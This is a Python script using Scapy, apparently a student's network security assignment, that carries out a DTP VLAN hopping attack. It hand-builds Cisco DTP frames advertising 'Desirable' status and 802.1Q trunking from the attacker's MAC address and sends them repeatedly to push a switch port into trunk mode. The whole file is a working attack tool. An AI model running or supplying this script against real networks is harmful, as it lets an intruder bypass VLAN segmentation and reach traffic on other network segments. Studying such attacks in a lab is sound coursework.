#!/usr/bin/env python3
from scapy.all import *
import struct
import time


def get_interfaces():
    return get_if_list()


def select_interface():
    interfaces = get_interfaces()
    print("\n[*] Interfaces disponibles:")
    for i, iface in enumerate(interfaces):
        print(f"  [{i}] {iface}")
    while True:
        try:
            idx = int(input("\n[?] Selecciona interfaz (número): "))
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
        except ValueError:
            pass
        print("[-] Opción inválida")


def build_dtp_packet(src_mac, domain="miguel.local"):
    """Construye paquete DTP manualmente (TLVs corregidos)"""
    mac_bytes = bytes.fromhex(src_mac.replace(":", ""))

    # Type=1 Domain, Length=4+len(value), Value=nombre de dominio VTP null-terminated
    domain_value = domain.encode() + b"\x00"
    tlv_domain = struct.pack("!HH", 0x0001, 4 + len(domain_value)) + domain_value

    # Type=2 Trunk Status, Length=5, Value=1 byte:
    #   bit7 (0x80) = Trunk Operating Status  -> 0=Access, 1=Trunk
    #   bits0-2 (0x07) = Trunk Administrative Status -> 1=On,2=Off,3=Desirable,4=Auto
    #   0x03 = Operating Access / Administrative Desirable (lo correcto para pedir Desirable)
    tlv_status = struct.pack("!HH", 0x0002, 0x0005) + b"\x03"

    # Type=3 Trunk Type, Length=5, Value=1 byte:
    #   bits5-7 (0xE0) = Trunk Operating Type -> 1=Native,2=ISL,5=802.1Q
    #   bits0-2 (0x07) = Trunk Administrative Type -> 0=Negotiated,1=Native,2=ISL,5=802.1Q
    #   0xa5 = Operating 802.1Q / Administrative 802.1Q
    tlv_type = struct.pack("!HH", 0x0003, 0x0005) + b"\xa5"

    # Type=4 Sender ID (Neighbor), Length=10, Value=MAC (6 bytes)
    tlv_neighbor = struct.pack("!HH", 0x0004, 0x000A) + mac_bytes

    dtp_payload = b"\x01" + tlv_domain + tlv_status + tlv_type + tlv_neighbor

    pkt = (
        Dot3(dst="01:00:0c:cc:cc:cc", src=src_mac)
        / LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03)
        / SNAP(OUI=0x00000C, code=0x2004)
        / Raw(load=dtp_payload)
    )
    return pkt


def send_dtp_desirable(iface):
    attacker_mac = get_if_hwaddr(iface)
    pkt = build_dtp_packet(attacker_mac)
    print(f"\n[*] MAC atacante : {attacker_mac}")
    print(f"[*] Interfaz     : {iface}")
    print("[*] Enviando DTP Desirable (Status=0x03, Type=0xa5) → negociando TRUNK...\n")
    for i in range(10):
        sendp(pkt, iface=iface, verbose=0)
        print(f"[+] Paquete DTP #{i + 1} enviado")
        time.sleep(1)
    print("\n[*] Listo. Verifica en el switch:")
    print("    show interfaces trunk")
    print("    show interfaces <puerto> switchport")


if __name__ == "__main__":
    print("=" * 50)
    print("  DTP VLAN Hopping Attack")
    print("  Seguridad de redes - MIGUEL RAMIREZ MELI - 2025-1367")
    print("=" * 50)
    iface = select_interface()
    print(f"[+] Usando interfaz: {iface}")
    send_dtp_desirable(iface)
